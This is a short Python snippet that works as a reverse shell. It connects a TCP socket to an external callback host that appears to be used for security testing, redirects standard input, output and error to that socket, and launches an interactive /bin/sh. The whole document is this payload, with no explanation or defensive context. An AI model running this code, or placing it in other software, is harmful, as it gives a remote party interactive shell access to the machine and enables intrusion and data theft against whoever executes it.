import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect((\"ymozema7qtrh5bumo0xbx7gu2l8cw40sp.l.prod.burpcloth.infosec.a2z.com\",80));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
